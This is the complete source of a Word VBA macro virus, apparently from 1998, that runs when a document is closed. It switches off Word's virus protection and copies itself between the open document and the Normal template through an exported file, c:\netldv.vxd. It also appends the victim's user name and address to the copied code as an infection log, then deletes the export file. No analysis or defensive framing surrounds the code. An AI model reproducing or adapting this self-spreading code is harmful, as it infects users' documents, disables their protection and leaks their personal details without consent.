   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()

   On Error Resume Next

   Const Marker = "<- this is a marker!"
   Const ExportFile = "c:\netldv.vxd"

   'Declare Variables
   Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
   Dim ad, nt As Object
   Dim UserAddress As String


   'Initialize Variables
   Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
   Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

   DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
   NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


   'Switch the VirusProtection OFF
   Options.VirusProtection = False


   'Make sure that some conditions are true before we continue infecting anything
   If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
      (ActiveDocument.SaveFormat = wdFormatDocument Or _
      ActiveDocument.SaveFormat = wdFormatTemplate) Then


     'Infect the NormalTemplate
     If DocumentInfected = True Then

       SaveNormalTemplate = NormalTemplate.Saved

       ad.Export ExportFile                    'Export from the ActiveDocument

       'Write a log file of this NormalTemplate infection
       For i = 1 To Len(Application.UserAddress)
         If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
           If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
             UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
           End If
         Else
           UserAddress = UserAddress & Chr(13) & "' "
         End If
       Next i

       Open ExportFile For Append As #1
       Print #1, "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                 Format(Date, "dddd, d mmm yyyy") & _
                 Chr(13) & "' " & Application.UserName & _
                 Chr(13) & "' " & UserAddress
       Close #1


       nt.CodeModule.AddFromFile ExportFile    'Import into the NormalTemplate
       nt.CodeModule.DeleteLines 1, 4          'Remove some unnessesary lines

       If SaveNormalTemplate = True Then NormalTemplate.Save

     End If


     'Infect the ActiveDocument
     If NormalTemplateInfected = True And _
        (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
        ActiveDocument.Saved = False) Then

       SaveDocument = ActiveDocument.Saved

       nt.Export ExportFile                    'Export from the NormalTemplate
       ad.CodeModule.AddFromFile ExportFile    'Import into the ActiveDocument
       ad.CodeModule.DeleteLines 1, 4          'Remove some unnessesary lines

       If SaveDocument = True Then ActiveDocument.Save

     End If


     Kill ExportFile                           'Delete the file which
                                               'stores the virus's
                                               'source code

   End If

   End Sub

   ' 08:26:42  - Sonntag, 22 Nov 1998
   ' SPo0Ky
   ' Blue Planet
